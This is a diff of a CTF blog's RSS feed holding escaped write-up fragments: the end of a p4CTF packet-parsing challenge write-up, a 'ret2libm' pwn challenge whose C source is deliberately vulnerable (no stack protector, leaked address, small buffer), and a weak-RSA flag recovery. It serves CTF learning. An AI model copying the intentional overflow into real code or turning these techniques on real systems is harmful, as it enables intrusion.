+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;FromIP&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SrcAddr&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;FromPort&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SrcPort&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;ToIP&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DstAddr&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;ToPort&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DstPort&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I did think of this before trying the other method, but I didn&amp;rsquo;t know how to edit packets in Wireshark or &lt;code&gt;tcprelay&lt;/code&gt; some malformed packets to do so.&lt;/p&gt;
+&lt;p&gt;cypis posted the solve script on discord, using &lt;code&gt;scapy&lt;/code&gt; to relay the packets in python, which is cool. I think (correct me if I&amp;rsquo;m wrong) the solution causes &lt;code&gt;layers.UnpackAll(data, packet.IPv4)&lt;/code&gt; to hang due to a malformed packet pointing out of bounds somewhere.&lt;/p&gt;
+
+  &lt;img src=&#34;./img/intended.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+&lt;p&gt;Overall I thought it was a fun challenge, and despite the funny unintended solution, the intended solution was quite nice as well!&lt;/p&gt;
+&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;p4CTF Finals was definetely one of the best CTFs I&amp;rsquo;ve been to, not to mention meeting everyone from top teams was really cool! After the event there was an after party, and it was fun talking to the organisers and competitors.p4CTF team&lt;/p&gt;
+&lt;p&gt;Again, huge thanks to the &lt;a href=&#34;https://twitter.com/p4_team&#34;&gt;p4CTF team&lt;/a&gt; for hosting the event, and our sponsors who made it possible for us to go! And thanks to my teammates &lt;a href=&#34;https://twitter.com/toasterpwn&#34;&gt;&lt;code&gt;toasterpwn&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/_bradan&#34;&gt;&lt;code&gt;bradan&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/torrytwooo&#34;&gt;&lt;code&gt;torry2&lt;/code&gt;&lt;/a&gt; for playing with me!&lt;/p&gt;
+&lt;p&gt;If we qualify next year, I&amp;rsquo;ll definetely be coming to the event again - given that our travel does not take 50 hours again!&lt;/p&gt;
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;img src=&#34;./img/irl_scoreboard.jpg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;
+
+
+</content>
+    </item>
+    
     <item>
       <title>what-a-maze-meant - DEFCON Quals 2023 Writeup</title>
       <link>https://TheSavageTeddy.github.io/posts/what-a-maze-meant-defcon-2023-quals/</link>
@@ -532,7 +1402,7 @@ p.interactive()
 &lt;p&gt;It was fun playing with a lot of people, and for the second day I met up with some of my teammates to solve more challenges - you can see &lt;a href=&#34;https://twitter.com/toasterpwn&#34;&gt;&lt;code&gt;toasterpwn&lt;/code&gt;&lt;/a&gt;&amp;rsquo;s writeup on them &lt;a href=&#34;https://toasterpwn.github.io/posts/defcon-ctf-2023-qualifiers/&#34;&gt;here&lt;/a&gt;!&lt;/p&gt;
 &lt;p&gt;Unfortunately this CTF was right in the middle of my exams so I couldn&amp;rsquo;t dedicate full time to it, but I hope to play with everyone again and hopefully qualify next year! Thanks for reading!&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;TheSavageTeddy / uwuteddy&lt;/li&gt;
+&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
 &lt;/ul&gt;
 </content>
     </item>
@@ -547,7 +1417,7 @@ p.interactive()
 Description:
 I need to make a pwn? Let&amp;rsquo;s go with that standard warmup rop thing&amp;hellip; what was it&amp;hellip; ret2libm?
 We are provided with a zip file containing a binary, source code, libc, libm, and Makefile.
-cchal.c#include &amp;lt;math.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;// gcc -fno-stack-protector -lmint main(int argc, char* argv) {setvbuf(stdin, NULL, _IONBF, 0);setvbuf(stdout, NULL, _IONBF, 0);char yours[8];printf(&amp;#34;Check out my pecs: %p\n&amp;#34;, fabs);printf(&amp;#34;How about yours?</description>
+c chal.c #include &amp;lt;math.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; // gcc -fno-stack-protector -lm int main(int argc, char* argv) { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); char yours[8]; printf(&amp;#34;Check out my pecs: %p\n&amp;#34;, fabs); printf(&amp;#34;How about yours?</description>
       <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
 &lt;p&gt;&lt;code&gt;ret2libm&lt;/code&gt; was the 2nd most solved &lt;code&gt;pwn&lt;/code&gt; challenge of &lt;a href=&#34;https://ctftime.org/event/1774&#34;&gt;IrisCTF 2023&lt;/a&gt;, written by &lt;code&gt;sera&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Description:&lt;/p&gt;
@@ -807,8 +1677,8 @@ flag: 39545236548455985927301569372696881408674800611184573074359458755790286957
 &lt;p&gt;Looking at the source, it looks like standard RSA, but noticed on this line:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# We encrypt our input&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;encrypted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (flag &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; e) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;the &amp;ldquo;encryption&amp;rdquo; is not RSA, as it uses multiplication instead of exponentiation. This means we can calculate an &lt;a href=&#34;https://en.wikipedia.org/wiki/Modular_multiplicative_inverse&#34;&gt;inverse element&lt;/a&gt; &lt;code&gt;k&lt;/code&gt; for &lt;code&gt;e&lt;/code&gt; and &lt;code&gt;n&lt;/code&gt; where &lt;code&gt;e * k = 1 (mod n)&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Then we multiply this by &lt;code&gt;encrypted&lt;/code&gt; mod &lt;code&gt;n&lt;/code&gt; to recover the flag.&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;the &amp;ldquo;encryption&amp;rdquo; is not RSA, as it uses multiplication instead of exponentiation. This means we can calculate an &lt;a href=&#34;https://en.wikipedia.org/wiki/Modular_multiplicative_inverse&#34;&gt;inverse element&lt;/a&gt; \(k\) for \(e\) and \(n\) where \(e \times k = 1 \pmod{n}\).&lt;/p&gt;
+&lt;p&gt;Then we multiply this (\(k\)) by &lt;code&gt;encrypted&lt;/code&gt; mod &lt;code&gt;n&lt;/code&gt; to recover the flag.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21429933885346644587620272790089165813353259223649897308397918491861562279767580488441831451651834802520437234248670652477414296159324726172158330221397420877323921934377321483041598028053870169281419856238830264612049920637819183013812186448416408328958360799645342598727238977986741643705720539702955864527935398839069236768630867447760912744208154645904678859979378604386855741350220991958191408182147658532111413386776058224418484895056146180001830405844881486308594953615999140110712045286000170660686758188247928230655746746482354748673482506070246808187808961599576834080344066055446605664648340486804023919467&lt;/span&gt;
@@ -2522,7 +3392,9 @@ Your challenge response (flag) is this total.&lt;/p&gt;
 &lt;h1 id=&#34;6-osint&#34;&gt;6. OSINT&lt;/h1&gt;
 &lt;p&gt;Okay, I only solved 2 out of 8 OSINT challenges, so I won&amp;rsquo;t be doing any OSINT writeups. I really couldn&amp;rsquo;t be bothered with OSINT after all the other chals, as I don&amp;rsquo;t really enjoy OSINT particularly.&lt;/p&gt;
 &lt;p&gt;So that&amp;rsquo;s it for the writeups! Doubt anyone read almost 1000 lines of Markdown, but thanks for reading!&lt;/p&gt;
-&lt;p&gt;- TheSavageTeddy / theuwuteddy&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
+&lt;/ul&gt;
 </content>
     </item>
     
